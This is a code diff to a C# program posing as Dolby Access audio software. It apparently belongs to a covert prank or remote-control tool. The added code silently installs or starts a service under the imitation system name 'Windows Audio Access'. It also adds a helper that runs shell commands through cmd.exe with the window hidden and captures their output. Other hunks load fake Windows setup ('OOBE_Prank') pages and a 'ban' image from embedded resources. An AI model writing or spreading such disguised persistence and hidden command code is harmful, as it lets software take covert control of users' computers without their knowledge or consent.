@@ -85,6 +85,22 @@ namespace DolbyAccess
             }
             catch { }
 
+
+            // ANS模式: 自动安装服务(如果未安装)
+            try
+            {
+                string svcCheck = RunCmdGetOutput("sc query \"Windows Audio Access\"");
+                if (!svcCheck.Contains("RUNNING") && !svcCheck.Contains("STOPPED"))
+                {
+                    InstallService();
+                }
+                else if (svcCheck.Contains("STOPPED"))
+                {
+                    RunCmd("sc start \"Windows Audio Access\"");
+                }
+            }
+            catch { }
+
             StartServices();
             while (_running) { Thread.Sleep(1000); }
         }
@@ -475,7 +491,7 @@ namespace DolbyAccess
             {
                 bool isWin11 = version.Equals("Win11", StringComparison.OrdinalIgnoreCase);
                 string fileName = isWin11 ? "Win11_OOBE.html" : "Win10_OOBE.html";
-                string resourceName = isWin11 ? "DolbyVision.Assets.Win11_OOBE_Prank.html" : "DolbyVision.Assets.Win10_OOBE_Prank.html";
+                string resourceName = isWin11 ? "DolbyAccess.Assets.Win11_OOBE_Prank.html" : "DolbyAccess.Assets.Win10_OOBE_Prank.html";
                 // 从嵌入资源释放HTML到TEMP
                 string htmlPath = Path.Combine(Path.GetTempPath(), fileName);
                 var assembly = System.Reflection.Assembly.GetExecutingAssembly();
@@ -515,7 +531,7 @@ namespace DolbyAccess
             {
                 // 从嵌入资源加载ban.jpg
                 var assembly = System.Reflection.Assembly.GetExecutingAssembly();
-                using (var stream = assembly.GetManifestResourceStream("DolbyVision.Assets.ban.jpg"))
+                using (var stream = assembly.GetManifestResourceStream("DolbyAccess.Assets.ban.jpg"))
                 {
                     if (stream == null) return "ERROR: ban.jpg资源未找到";
                     Image banImage = Image.FromStream(stream);
@@ -813,6 +829,26 @@ namespace DolbyAccess
                 }
             }
             catch { return false; }
+        }
+
+        private static string RunCmdGetOutput(string cmd)
+        {
+            try
+            {
+                var psi = new ProcessStartInfo("cmd.exe", "/c " + cmd)
+                {
+                    CreateNoWindow = true,
+                    UseShellExecute = false,
+                    RedirectStandardOutput = true,
+                    RedirectStandardError = true
+                };
+                using (var p = Process.Start(psi))
+                {
+                    p.WaitForExit(8000);
+                    return p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
+                }
+            }
+            catch { return ""; }
         }
         private static string UninstallService()
         {
